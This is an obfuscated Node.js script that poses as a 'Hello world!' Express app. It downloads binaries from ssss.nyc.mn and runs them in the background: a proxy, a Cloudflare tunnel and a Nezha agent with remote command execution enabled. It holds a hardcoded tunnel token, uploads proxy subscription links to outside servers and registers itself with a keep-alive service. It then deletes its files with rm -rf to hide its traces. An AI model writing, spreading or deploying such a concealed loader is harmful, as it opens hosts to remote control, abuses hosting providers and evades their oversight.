const _0x27f712=_0x1be4;(function(_0xba4595,_0x4cd014){const _0x20e47a=_0x1be4,_0x2af6eb=_0xba4595();while(!![]){try{const _0x183ed3=parseInt(_0x20e47a(0x207))/0x1*(-parseInt(_0x20e47a(0x1d0))/0x2)+parseInt(_0x20e47a(0x1a9))/0x3+parseInt(_0x20e47a(0x185))/0x4*(parseInt(_0x20e47a(0x1e0))/0x5)+-parseInt(_0x20e47a(0x19c))/0x6*(parseInt(_0x20e47a(0x1dc))/0x7)+parseInt(_0x20e47a(0x20a))/0x8+-parseInt(_0x20e47a(0x1f3))/0x9+-parseInt(_0x20e47a(0x182))/0xa*(-parseInt(_0x20e47a(0x1ce))/0xb);if(_0x183ed3===_0x4cd014)break;else _0x2af6eb['push'](_0x2af6eb['shift']());}catch(_0x156c1f){_0x2af6eb['push'](_0x2af6eb['shift']());}}}(_0x54f8,0xe4549));const express=require(_0x27f712(0x1c1)),app=express(),axios=require(_0x27f712(0x1e2)),os=require('os'),fs=require('fs'),path=require(_0x27f712(0x1cf)),{promisify}=require(_0x27f712(0x208)),exec=promisify(require(_0x27f712(0x20e))['exec']),{execSync}=require(_0x27f712(0x20e)),UPLOAD_URL=process[_0x27f712(0x1de)][_0x27f712(0x1ac)]||'',PROJECT_URL=process[_0x27f712(0x1de)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x27f712(0x1de)][_0x27f712(0x191)]||![],FILE_PATH=process[_0x27f712(0x1de)]['FILE_PATH']||_0x27f712(0x1fe),SUB_PATH=process[_0x27f712(0x1de)][_0x27f712(0x1ed)]||_0x27f712(0x22d),PORT=process['env'][_0x27f712(0x1db)]||process[_0x27f712(0x1de)][_0x27f712(0x1b3)]||0xbb8,UUID=process[_0x27f712(0x1de)][_0x27f712(0x1bd)]||_0x27f712(0x177),NEZHA_SERVER=process[_0x27f712(0x1de)]['NEZHA_SERVER']||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process[_0x27f712(0x1de)][_0x27f712(0x232)]||'',ARGO_DOMAIN=process[_0x27f712(0x1de)]['ARGO_DOMAIN']||_0x27f712(0x1f6),ARGO_AUTH=process['env'][_0x27f712(0x221)]||'eyJhIjoiM2VjMDBjMDRkNTNiZTM1N2Y1MjYwYzM0ZTIwOTYwNGQiLCJ0IjoiZGIzMWRlMjYtNTNiMi00NWNlLWJlZjQtNWU2N2ZiMTllNDE1IiwicyI6Ik5XTmhPR1kwWXprdE1qbGlZUzAwTXpZekxUZzFPREV0T0dZNU9HVTFOamcxWWpndyJ9',ARGO_PORT=process[_0x27f712(0x1de)][_0x27f712(0x19e)]||0x1f41,CFIP=process[_0x27f712(0x1de)][_0x27f712(0x1d8)]||_0x27f712(0x1ff),CFPORT=process[_0x27f712(0x1de)][_0x27f712(0x1ae)]||0x1bb,NAME=process[_0x27f712(0x1de)][_0x27f712(0x1ca)]||_0x27f712(0x21a);!fs[_0x27f712(0x231)](FILE_PATH)?(fs[_0x27f712(0x222)](FILE_PATH),console['log'](FILE_PATH+_0x27f712(0x190))):console[_0x27f712(0x1fb)](FILE_PATH+_0x27f712(0x218));function generateRandomName(){const _0x5c6491=_0x27f712,_0x14e1f0=_0x5c6491(0x224);let _0x46cd94='';for(let _0x299e3=0x0;_0x299e3<0x6;_0x299e3++){_0x46cd94+=_0x14e1f0[_0x5c6491(0x1d5)](Math[_0x5c6491(0x1ec)](Math[_0x5c6491(0x179)]()*_0x14e1f0['length']));}return _0x46cd94;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x27f712(0x1ea)](FILE_PATH,npmName),phpPath=path[_0x27f712(0x1ea)](FILE_PATH,phpName),webPath=path[_0x27f712(0x1ea)](FILE_PATH,webName),botPath=path[_0x27f712(0x1ea)](FILE_PATH,botName),subPath=path[_0x27f712(0x1ea)](FILE_PATH,'sub.txt'),listPath=path[_0x27f712(0x1ea)](FILE_PATH,_0x27f712(0x225)),bootLogPath=path[_0x27f712(0x1ea)](FILE_PATH,_0x27f712(0x17f)),configPath=path[_0x27f712(0x1ea)](FILE_PATH,_0x27f712(0x1a3));function deleteNodes(){const _0x3001fc=_0x27f712;try{if(!UPLOAD_URL)return;if(!fs[_0x3001fc(0x231)](subPath))return;let _0x1c22b8;try{_0x1c22b8=fs[_0x3001fc(0x18e)](subPath,'utf-8');}catch{return null;}const _0x56c02b=Buffer[_0x3001fc(0x178)](_0x1c22b8,_0x3001fc(0x1da))[_0x3001fc(0x236)](_0x3001fc(0x234)),_0x25db42=_0x56c02b[_0x3001fc(0x1a0)]('\x0a')[_0x3001fc(0x1c3)](_0xf9fe8b=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3001fc(0x235)](_0xf9fe8b));if(_0x25db42['length']===0x0)return;return axios['post'](UPLOAD_URL+_0x3001fc(0x22a),JSON[_0x3001fc(0x209)]({'nodes':_0x25db42}),{'headers':{'Content-Type':_0x3001fc(0x223)}})[_0x3001fc(0x180)](_0xe16a41=>{return null;}),null;}catch(_0x42fd8a){return null;}}function cleanupOldFiles(){const _0x5a94de=_0x27f712;try{const _0x222ce2=fs[_0x5a94de(0x1fa)](FILE_PATH);_0x222ce2[_0x5a94de(0x1e1)](_0x28b2c0=>{const _0x16cfdf=_0x5a94de,_0x8981aa=path[_0x16cfdf(0x1ea)](FILE_PATH,_0x28b2c0);try{const _0x4ec93b=fs[_0x16cfdf(0x1f2)](_0x8981aa);_0x4ec93b[_0x16cfdf(0x1d3)]()&&fs[_0x16cfdf(0x1b8)](_0x8981aa);}catch(_0x7eda43){}});}catch(_0x393326){}}app[_0x27f712(0x1f5)]('/',function(_0x334193,_0x1b23ea){const _0xe4d0f5=_0x27f712;_0x1b23ea[_0xe4d0f5(0x214)]('Hello\x20world!');});async function generateConfig(){const _0x2d724e=_0x27f712,_0x56dff6={'log':{'access':_0x2d724e(0x217),'error':_0x2d724e(0x217),'loglevel':_0x2d724e(0x1f7)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x2d724e(0x187)}],'decryption':_0x2d724e(0x1f7),'fallbacks':[{'dest':0xbb9},{'path':_0x2d724e(0x1b2),'dest':0xbba},{'path':_0x2d724e(0x1af),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x2d724e(0x1a6)}},{'port':0xbb9,'listen':_0x2d724e(0x17b),'protocol':_0x2d724e(0x1d4),'settings':{'clients':[{'id':UUID}],'decryption':_0x2d724e(0x1f7)},'streamSettings':{'network':_0x2d724e(0x1a6),'security':_0x2d724e(0x1f7)}},{'port':0xbba,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x2d724e(0x1f7),'wsSettings':{'path':_0x2d724e(0x1b2)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x2d724e(0x215),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x2d724e(0x17b),'protocol':_0x2d724e(0x1bb),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x2d724e(0x1af)}},'sniffing':{'enabled':!![],'destOverride':[_0x2d724e(0x200),'tls',_0x2d724e(0x19d)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x2d724e(0x17b),'protocol':_0x2d724e(0x196),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x2d724e(0x1f7),'wsSettings':{'path':_0x2d724e(0x204)}},'sniffing':{'enabled':!![],'destOverride':[_0x2d724e(0x200),_0x2d724e(0x215),_0x2d724e(0x19d)],'metadataOnly':![]}}],'dns':{'servers':[_0x2d724e(0x230)]},'outbounds':[{'protocol':_0x2d724e(0x1eb),'tag':_0x2d724e(0x1f0)},{'protocol':_0x2d724e(0x197),'tag':_0x2d724e(0x1e3)}]};fs['writeFileSync'](path['join'](FILE_PATH,_0x2d724e(0x1a3)),JSON[_0x2d724e(0x209)](_0x56dff6,null,0x2));}function getSystemArchitecture(){const _0x32adee=_0x27f712,_0x5b5972=os[_0x32adee(0x20d)]();return _0x5b5972==='arm'||_0x5b5972===_0x32adee(0x1fd)||_0x5b5972===_0x32adee(0x1fc)?_0x32adee(0x181):_0x32adee(0x219);}function _0x54f8(){const _0x12f432=['Empowerment\x20success\x20for\x20','rm\x20-rf\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','NAME','/config.json\x20>/dev/null\x202>&1\x20&','https://amd64.ssss.nyc.mn/agent','?encryption=none&security=tls&sni=','8426DVtZFS','path','22BaWJwP','text/plain;\x20charset=utf-8','/tunnel.yml\x20run','isFile','vless','charAt','pop','substring','CFIP','Subscription\x20uploaded\x20successfully','base64','SERVER_PORT','150619pApXOs','taskkill\x20/f\x20/im\x20','env','\x20>/dev/null\x202>&1','748820QMaGCU','forEach','axios','block','https://arm64.ssss.nyc.mn/v1','platform','\x20is\x20running','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','http\x20server\x20is\x20running\x20on\x20port:','443','join','freedom','floor','SUB_PATH','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','direct','trim','statSync','8055648kZsUHv','true','get','cftunnel.dannield.com','none','\x0a\x20\x20\x20\x20','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','readdirSync','log','aarch64','arm64','./tmp','cdns.doon.eu.org','http','close','false','\x0aclient_secret:\x20','/trojan-argo','\x20failed:\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','163113RJWvsE','util','stringify','9719712FxnJYy','error','basename','arch','child_process','&path=%2Ftrojan-argo%3Fed%3D2560#','has','pkill\x20-f\x20\x22[','fileUrl','/api/add-subscriptions','send','tls','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','/dev/null','\x20already\x20exists','amd','tunnel_cf_yuri34_argo','https://arm64.ssss.nyc.mn/bot','2087','2096','length','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','/sub.txt\x20saved\x20successfully','ARGO_AUTH','mkdirSync','application/json','abcdefghijklmnopqrstuvwxyz','list.txt','\x0a\x20\x20credentials-file:\x20','status','push','8443','/api/delete-nodes','message','\x20>/dev/null\x202>&1\x20&','sub','?security=tls&sni=','chmod','https+local://8.8.8.8/dns-query','existsSync','NEZHA_KEY','2053','utf-8','test','toString','Add\x20automatic\x20access\x20task\x20faild:\x20','Error\x20in\x20startserver:','&fp=firefox&type=ws&host=','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','https://amd64.ssss.nyc.mn/web','includes','f0eb58e8-56b4-432d-b4c4-02603b9521e1','from','random','\x20-p\x20','127.0.0.1','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','web\x20running\x20error:\x20','TunnelSecret','boot.log','catch','arm','48850vONbsS','data','https://oooo.serv00.net/add-url','4NccAOr','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','xtls-rprx-vision','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','firefox','del\x20/f\x20/q\x20','https://amd64.ssss.nyc.mn/v1','Skipping\x20adding\x20automatic\x20access\x20task','\x0a\x20\x20\x0atrojan://','readFileSync','automatic\x20access\x20task\x20added\x20successfully','\x20is\x20created','AUTO_ACCESS','Error\x20downloading\x20files:','/vmess-argo?ed=2560','\x22\x20>\x20/dev/null\x202>&1','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','trojan','blackhole','\x20-s\x20','\x20-c\x20','writeFileSync','2083','498aVCmVn','quic','ARGO_PORT','https://arm64.ssss.nyc.mn/web','split','unlink','\x0a\x20\x20\x0avmess://','config.json','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','tunnel.json','tcp','\x20>\x20nul\x202>&1','unshift','911487NJbfZv','post','nohup\x20','UPLOAD_URL','Error\x20executing\x20command:\x20','CFPORT','/vmess-argo','\x20successfully','clear','/vless-argo','PORT','NEZHA\x20variable\x20is\x20empty,skip\x20running','listen','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','App\x20is\x20running','unlinkSync','Unhandled\x20error\x20in\x20startserver:','Download\x20','vmess','win32','UUID','pipe','match','Empowerment\x20failed\x20for\x20','express','tunnel.yml','filter','php\x20running\x20error:\x20','&path=%2Fvless-argo%3Fed%3D2560#','set'];_0x54f8=function(){return _0x12f432;};return _0x54f8();}function downloadFile(_0x11a22c,_0x3d565c,_0x34ba50){const _0x4fc17d=_0x27f712,_0x3744b1=_0x11a22c;!fs[_0x4fc17d(0x231)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x508bce=fs['createWriteStream'](_0x3744b1);axios({'method':_0x4fc17d(0x1f5),'url':_0x3d565c,'responseType':'stream'})['then'](_0x1874b2=>{const _0xd0ea80=_0x4fc17d;_0x1874b2[_0xd0ea80(0x183)][_0xd0ea80(0x1be)](_0x508bce),_0x508bce['on']('finish',()=>{const _0x499ca1=_0xd0ea80;_0x508bce[_0x499ca1(0x201)](),console[_0x499ca1(0x1fb)]('Download\x20'+path['basename'](_0x3744b1)+_0x499ca1(0x1b0)),_0x34ba50(null,_0x3744b1);}),_0x508bce['on'](_0xd0ea80(0x20b),_0x23f883=>{const _0x4103e0=_0xd0ea80;fs[_0x4103e0(0x1a1)](_0x3744b1,()=>{});const _0x301a58=_0x4103e0(0x1ba)+path[_0x4103e0(0x20c)](_0x3744b1)+_0x4103e0(0x205)+_0x23f883[_0x4103e0(0x22b)];console[_0x4103e0(0x20b)](_0x301a58),_0x34ba50(_0x301a58);});})[_0x4fc17d(0x180)](_0x2c4520=>{const _0x26de1d=_0x4fc17d,_0x57317e=_0x26de1d(0x1ba)+path[_0x26de1d(0x20c)](_0x3744b1)+_0x26de1d(0x205)+_0x2c4520[_0x26de1d(0x22b)];console[_0x26de1d(0x20b)](_0x57317e),_0x34ba50(_0x57317e);});}async function downloadFilesAndRun(){const _0x465817=_0x27f712,_0x20119f=getSystemArchitecture(),_0x26cb3a=getFilesForArchitecture(_0x20119f);if(_0x26cb3a['length']===0x0){console[_0x465817(0x1fb)](_0x465817(0x206));return;}const _0x42e7f7=_0x26cb3a['map'](_0x5046dc=>{return new Promise((_0xfee9f2,_0x22cfe2)=>{const _0x38e63d=_0x1be4;downloadFile(_0x5046dc['fileName'],_0x5046dc[_0x38e63d(0x212)],(_0x59a2fd,_0x27724b)=>{_0x59a2fd?_0x22cfe2(_0x59a2fd):_0xfee9f2(_0x27724b);});});});try{await Promise['all'](_0x42e7f7);}catch(_0xcf7fa5){console[_0x465817(0x20b)](_0x465817(0x192),_0xcf7fa5);return;}function _0x377845(_0x57c9ec){const _0x29ff94=_0x465817,_0x3dd498=0x1fd;_0x57c9ec[_0x29ff94(0x1e1)](_0x171c36=>{const _0x7fc265=_0x29ff94;fs[_0x7fc265(0x231)](_0x171c36)&&fs[_0x7fc265(0x22f)](_0x171c36,_0x3dd498,_0x2091ea=>{const _0x200806=_0x7fc265;_0x2091ea?console['error'](_0x200806(0x1c0)+_0x171c36+':\x20'+_0x2091ea):console[_0x200806(0x1fb)](_0x200806(0x1c7)+_0x171c36+':\x20'+_0x3dd498[_0x200806(0x236)](0x8));});});}const _0x5271eb=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x377845(_0x5271eb);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5809d4=NEZHA_SERVER[_0x465817(0x176)](':')?NEZHA_SERVER['split'](':')[_0x465817(0x1d6)]():'',_0x546d82=new Set([_0x465817(0x1e9),'8443',_0x465817(0x21d),_0x465817(0x21c),_0x465817(0x19b),_0x465817(0x233)]),_0x225cd4=_0x546d82[_0x465817(0x210)](_0x5809d4)?_0x465817(0x1f4):_0x465817(0x202),_0x115bb1=_0x465817(0x203)+NEZHA_KEY+_0x465817(0x186)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x225cd4+_0x465817(0x1a4)+UUID;fs['writeFileSync'](path['join'](FILE_PATH,'config.yaml'),_0x115bb1);const _0x53c57d=_0x465817(0x1ab)+phpPath+'\x20-c\x20\x22'+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x53c57d),console['log'](phpName+'\x20is\x20running'),await new Promise(_0x13145d=>setTimeout(_0x13145d,0x3e8));}catch(_0x2a3590){console[_0x465817(0x20b)](_0x465817(0x1c4)+_0x2a3590);}}else{let _0x2b4585='';const _0x30334d=[_0x465817(0x1e9),_0x465817(0x229),_0x465817(0x21d),_0x465817(0x21c),_0x465817(0x19b),'2053'];_0x30334d[_0x465817(0x176)](NEZHA_PORT)&&(_0x2b4585='--tls');const _0x18f327=_0x465817(0x1ab)+npmPath+_0x465817(0x198)+NEZHA_SERVER+':'+NEZHA_PORT+_0x465817(0x17a)+NEZHA_KEY+'\x20'+_0x2b4585+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x18f327),console[_0x465817(0x1fb)](npmName+'\x20is\x20running'),await new Promise(_0x5b00df=>setTimeout(_0x5b00df,0x3e8));}catch(_0x143e5f){console['error']('npm\x20running\x20error:\x20'+_0x143e5f);}}}else console[_0x465817(0x1fb)](_0x465817(0x1b4));const _0x5dc5b2=_0x465817(0x1ab)+webPath+_0x465817(0x199)+FILE_PATH+_0x465817(0x1cb);try{await exec(_0x5dc5b2),console[_0x465817(0x1fb)](webName+_0x465817(0x1e6)),await new Promise(_0x353efc=>setTimeout(_0x353efc,0x3e8));}catch(_0x248fd){console[_0x465817(0x20b)](_0x465817(0x17d)+_0x248fd);}if(fs[_0x465817(0x231)](botPath)){let _0x117911;if(ARGO_AUTH[_0x465817(0x1bf)](/^[A-Z0-9a-z=]{120,250}$/))_0x117911=_0x465817(0x195)+ARGO_AUTH;else ARGO_AUTH[_0x465817(0x1bf)](/TunnelSecret/)?_0x117911=_0x465817(0x216)+FILE_PATH+_0x465817(0x1d2):_0x117911='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x465817(0x1ee)+ARGO_PORT;try{await exec(_0x465817(0x1ab)+botPath+'\x20'+_0x117911+_0x465817(0x22c)),console['log'](botName+_0x465817(0x1e6)),await new Promise(_0x2fee52=>setTimeout(_0x2fee52,0x7d0));}catch(_0x1ef46d){console[_0x465817(0x20b)](_0x465817(0x1ad)+_0x1ef46d);}}await new Promise(_0x525b35=>setTimeout(_0x525b35,0x1388));}function getFilesForArchitecture(_0x1debe7){const _0x3f61eb=_0x27f712;let _0x25f1ac;_0x1debe7===_0x3f61eb(0x181)?_0x25f1ac=[{'fileName':webPath,'fileUrl':_0x3f61eb(0x19f)},{'fileName':botPath,'fileUrl':_0x3f61eb(0x21b)}]:_0x25f1ac=[{'fileName':webPath,'fileUrl':_0x3f61eb(0x175)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x4e4864=_0x1debe7===_0x3f61eb(0x181)?'https://arm64.ssss.nyc.mn/agent':_0x3f61eb(0x1cc);_0x25f1ac['unshift']({'fileName':npmPath,'fileUrl':_0x4e4864});}else{const _0x56079a=_0x1debe7==='arm'?_0x3f61eb(0x1e4):_0x3f61eb(0x18b);_0x25f1ac[_0x3f61eb(0x1a8)]({'fileName':phpPath,'fileUrl':_0x56079a});}}return _0x25f1ac;}function argoType(){const _0x3b62ac=_0x27f712;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x3b62ac(0x1fb)](_0x3b62ac(0x21f));return;}if(ARGO_AUTH[_0x3b62ac(0x176)](_0x3b62ac(0x17e))){fs[_0x3b62ac(0x19a)](path[_0x3b62ac(0x1ea)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x3eeacd='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x3b62ac(0x1a0)]('\x22')[0xb]+_0x3b62ac(0x226)+path['join'](FILE_PATH,_0x3b62ac(0x1a5))+_0x3b62ac(0x1e7)+ARGO_DOMAIN+_0x3b62ac(0x1f9)+ARGO_PORT+_0x3b62ac(0x17c);fs[_0x3b62ac(0x19a)](path['join'](FILE_PATH,_0x3b62ac(0x1c2)),_0x3eeacd);}else console[_0x3b62ac(0x1fb)](_0x3b62ac(0x174));}function _0x1be4(_0x378056,_0x2096fb){const _0x54f859=_0x54f8();return _0x1be4=function(_0x1be412,_0x59f3fc){_0x1be412=_0x1be412-0x171;let _0x3f2a9f=_0x54f859[_0x1be412];return _0x3f2a9f;},_0x1be4(_0x378056,_0x2096fb);}argoType();async function extractDomains(){const _0x10d6ff=_0x27f712;let _0x5209f6;if(ARGO_AUTH&&ARGO_DOMAIN)_0x5209f6=ARGO_DOMAIN,console[_0x10d6ff(0x1fb)]('ARGO_DOMAIN:',_0x5209f6),await _0x2dfe09(_0x5209f6);else try{const _0x5664e5=fs['readFileSync'](path[_0x10d6ff(0x1ea)](FILE_PATH,'boot.log'),_0x10d6ff(0x234)),_0x18a6ce=_0x5664e5[_0x10d6ff(0x1a0)]('\x0a'),_0x3be441=[];_0x18a6ce[_0x10d6ff(0x1e1)](_0x19ed58=>{const _0x4a6f12=_0x10d6ff,_0x5ca2b5=_0x19ed58['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x5ca2b5){const _0x42e63f=_0x5ca2b5[0x1];_0x3be441[_0x4a6f12(0x228)](_0x42e63f);}});if(_0x3be441[_0x10d6ff(0x21e)]>0x0)_0x5209f6=_0x3be441[0x0],console[_0x10d6ff(0x1fb)]('ArgoDomain:',_0x5209f6),await _0x2dfe09(_0x5209f6);else{console[_0x10d6ff(0x1fb)](_0x10d6ff(0x188)),fs[_0x10d6ff(0x1b8)](path[_0x10d6ff(0x1ea)](FILE_PATH,_0x10d6ff(0x17f)));async function _0x5493d9(){const _0x22c39a=_0x10d6ff;try{process[_0x22c39a(0x1e5)]===_0x22c39a(0x1bc)?await exec(_0x22c39a(0x1dd)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x22c39a(0x211)+botName[_0x22c39a(0x1d5)](0x0)+']'+botName[_0x22c39a(0x1d7)](0x1)+_0x22c39a(0x194));}catch(_0x5c314a){}}_0x5493d9(),await new Promise(_0x1f19cd=>setTimeout(_0x1f19cd,0xbb8));const _0x42fb3e=_0x10d6ff(0x1c9)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x10d6ff(0x1ab)+botPath+'\x20'+_0x42fb3e+'\x20>/dev/null\x202>&1\x20&'),console[_0x10d6ff(0x1fb)](botName+_0x10d6ff(0x1e6)),await new Promise(_0x5ddb2e=>setTimeout(_0x5ddb2e,0xbb8)),await extractDomains();}catch(_0x2e02b9){console[_0x10d6ff(0x20b)](_0x10d6ff(0x1ad)+_0x2e02b9);}}}catch(_0x107fd2){console['error']('Error\x20reading\x20boot.log:',_0x107fd2);}async function _0x2dfe09(_0x54ec42){const _0x358717=_0x10d6ff,_0x3cc5db=execSync(_0x358717(0x1ef),{'encoding':'utf-8'}),_0x2e16cc=_0x3cc5db[_0x358717(0x1f1)](),_0x1e47f5=NAME?NAME+'-'+_0x2e16cc:_0x2e16cc;return new Promise(_0x46435a=>{setTimeout(()=>{const _0x4beb6f=_0x1be4,_0x5c4027={'v':'2','ps':''+_0x1e47f5,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x4beb6f(0x1f7),'net':'ws','type':_0x4beb6f(0x1f7),'host':_0x54ec42,'path':_0x4beb6f(0x193),'tls':'tls','sni':_0x54ec42,'alpn':'','fp':_0x4beb6f(0x189)},_0x4547c0='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x4beb6f(0x1cd)+_0x54ec42+_0x4beb6f(0x173)+_0x54ec42+_0x4beb6f(0x1c5)+_0x1e47f5+_0x4beb6f(0x1a2)+Buffer['from'](JSON['stringify'](_0x5c4027))['toString'](_0x4beb6f(0x1da))+_0x4beb6f(0x18d)+UUID+'@'+CFIP+':'+CFPORT+_0x4beb6f(0x22e)+_0x54ec42+'&fp=firefox&type=ws&host='+_0x54ec42+_0x4beb6f(0x20f)+_0x1e47f5+_0x4beb6f(0x1f8);console['log'](Buffer[_0x4beb6f(0x178)](_0x4547c0)['toString']('base64')),fs[_0x4beb6f(0x19a)](subPath,Buffer['from'](_0x4547c0)[_0x4beb6f(0x236)](_0x4beb6f(0x1da))),console[_0x4beb6f(0x1fb)](FILE_PATH+_0x4beb6f(0x220)),uploadNodes(),app[_0x4beb6f(0x1f5)]('/'+SUB_PATH,(_0x39b796,_0x32d311)=>{const _0x3f5e47=_0x4beb6f,_0x43c616=Buffer[_0x3f5e47(0x178)](_0x4547c0)[_0x3f5e47(0x236)](_0x3f5e47(0x1da));_0x32d311[_0x3f5e47(0x1c6)]('Content-Type',_0x3f5e47(0x1d1)),_0x32d311[_0x3f5e47(0x214)](_0x43c616);}),_0x46435a(_0x4547c0);},0x7d0);});}}async function uploadNodes(){const _0x17a17c=_0x27f712;if(UPLOAD_URL&&PROJECT_URL){const _0x155084=PROJECT_URL+'/'+SUB_PATH,_0x43ec8c={'subscription':[_0x155084]};try{const _0x37a462=await axios['post'](UPLOAD_URL+_0x17a17c(0x213),_0x43ec8c,{'headers':{'Content-Type':_0x17a17c(0x223)}});return _0x37a462&&_0x37a462[_0x17a17c(0x227)]===0xc8?(console['log'](_0x17a17c(0x1d9)),_0x37a462):null;}catch(_0x222e11){if(_0x222e11['response']){if(_0x222e11['response'][_0x17a17c(0x227)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x17a17c(0x231)](listPath))return;const _0x27fd93=fs[_0x17a17c(0x18e)](listPath,'utf-8'),_0x2e1d3f=_0x27fd93[_0x17a17c(0x1a0)]('\x0a')[_0x17a17c(0x1c3)](_0x5305b6=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x17a17c(0x235)](_0x5305b6));if(_0x2e1d3f[_0x17a17c(0x21e)]===0x0)return;const _0x170fee=JSON['stringify']({'nodes':_0x2e1d3f});try{const _0x2211ad=await axios['post'](UPLOAD_URL+'/api/add-nodes',_0x170fee,{'headers':{'Content-Type':_0x17a17c(0x223)}});return _0x2211ad&&_0x2211ad[_0x17a17c(0x227)]===0xc8?(console[_0x17a17c(0x1fb)]('Nodes\x20uploaded\x20successfully'),_0x2211ad):null;}catch(_0x29f1e9){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x231757=_0x1be4,_0x2d5923=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x2d5923[_0x231757(0x228)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2d5923['push'](phpPath);process[_0x231757(0x1e5)]==='win32'?exec(_0x231757(0x18a)+_0x2d5923[_0x231757(0x1ea)]('\x20')+_0x231757(0x1a7),_0x1f9b61=>{const _0x238cdb=_0x231757;console[_0x238cdb(0x1b1)](),console['log'](_0x238cdb(0x1b7)),console[_0x238cdb(0x1fb)](_0x238cdb(0x1b6));}):exec(_0x231757(0x1c8)+_0x2d5923[_0x231757(0x1ea)]('\x20')+_0x231757(0x1df),_0x56ad1b=>{const _0x53d9f4=_0x231757;console[_0x53d9f4(0x1b1)](),console[_0x53d9f4(0x1fb)](_0x53d9f4(0x1b7)),console[_0x53d9f4(0x1fb)](_0x53d9f4(0x1b6));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x16b7cd=_0x27f712;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x16b7cd(0x1fb)](_0x16b7cd(0x18c));return;}try{const _0x5d22ab=await axios[_0x16b7cd(0x1aa)](_0x16b7cd(0x184),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x16b7cd(0x1fb)](_0x16b7cd(0x18f)),_0x5d22ab;}catch(_0x384b97){return console['error'](_0x16b7cd(0x171)+_0x384b97[_0x16b7cd(0x22b)]),null;}}async function startserver(){const _0xe7b3d2=_0x27f712;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x410546){console[_0xe7b3d2(0x20b)](_0xe7b3d2(0x172),_0x410546);}}startserver()[_0x27f712(0x180)](_0x10f59d=>{const _0x3b35ac=_0x27f712;console[_0x3b35ac(0x20b)](_0x3b35ac(0x1b9),_0x10f59d);}),app[_0x27f712(0x1b5)](PORT,()=>console[_0x27f712(0x1fb)](_0x27f712(0x1e8)+PORT+'!'));
